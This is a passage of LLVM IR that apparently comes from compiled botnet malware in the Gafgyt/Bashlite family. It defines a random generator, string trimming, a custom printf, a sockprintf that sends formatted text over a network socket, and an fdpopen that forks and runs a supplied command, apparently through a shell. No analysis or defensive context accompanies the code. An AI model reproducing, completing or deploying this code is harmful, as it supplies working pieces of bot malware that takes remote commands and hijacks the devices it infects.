  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

34:                                               ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #11
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #11
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #11
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @zprintf(i8* %0, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @print(i8** %0, i8* %1, %struct.__va_list_tag* %2) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

12:                                               ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

17:                                               ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

22:                                               ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

29:                                               ; preds = %22
  br label %286

30:                                               ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

35:                                               ; preds = %30
  br label %275

36:                                               ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

41:                                               ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

44:                                               ; preds = %41, %36
  br label %45

45:                                               ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

50:                                               ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45, !llvm.loop !11

55:                                               ; preds = %45
  br label %56

56:                                               ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

61:                                               ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

66:                                               ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

68:                                               ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

77:                                               ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56, !llvm.loop !12

80:                                               ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

85:                                               ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

90:                                               ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

96:                                               ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

101:                                              ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

109:                                              ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

111:                                              ; preds = %101
  br label %112

112:                                              ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.132, i64 0, i64 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

119:                                              ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

124:                                              ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

130:                                              ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

136:                                              ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

141:                                              ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

149:                                              ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

154:                                              ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

160:                                              ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

166:                                              ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

171:                                              ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

179:                                              ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

184:                                              ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

190:                                              ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

196:                                              ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

201:                                              ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

209:                                              ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

214:                                              ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

220:                                              ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

226:                                              ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

231:                                              ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

239:                                              ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

244:                                              ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

249:                                              ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

255:                                              ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

260:                                              ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

273:                                              ; preds = %239
  br label %282

274:                                              ; preds = %17
  br label %275

275:                                              ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

282:                                              ; preds = %275, %273
  br label %283

283:                                              ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12, !llvm.loop !13

286:                                              ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

289:                                              ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

292:                                              ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @szprintf(i8* %0, i8* %1, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @sockprintf(i32 %0, i8* %1, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias align 16 i8* @malloc(i64 2048) #12
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %10, i8 0, i64 2048, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #11
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i64 0, i64 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #11
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #12
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_end(i8*) #2

declare i64 @send(i32, i8*, i64, i32) #5

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdpopen(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

19:                                               ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

25:                                               ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

26:                                               ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %28 = call i32 @pipe(i32* %27) #12
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

31:                                               ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

34:                                               ; preds = %31
  %35 = call i32 @getdtablesize() #12
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

37:                                               ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

38:                                               ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias align 16 i8* @malloc(i64 %43) #12
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

47:                                               ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

48:                                               ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* align 1 %50, i8 0, i64 %53, i1 false)
  br label %54

54:                                               ; preds = %48, %31
  %55 = call i32 @vfork() #13
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

56:                                               ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

63:                                               ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

68:                                               ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

72:                                               ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #12
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

79:                                               ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

83:                                               ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

87:                                               ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #12
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

94:                                               ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

98:                                               ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.66, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.67, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.68, i64 0, i64 0), i8* %99, i8* null) #12
  call void @_exit(i32 127) #14
  unreachable

101:                                              ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

106:                                              ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

112:                                              ; preds = %101
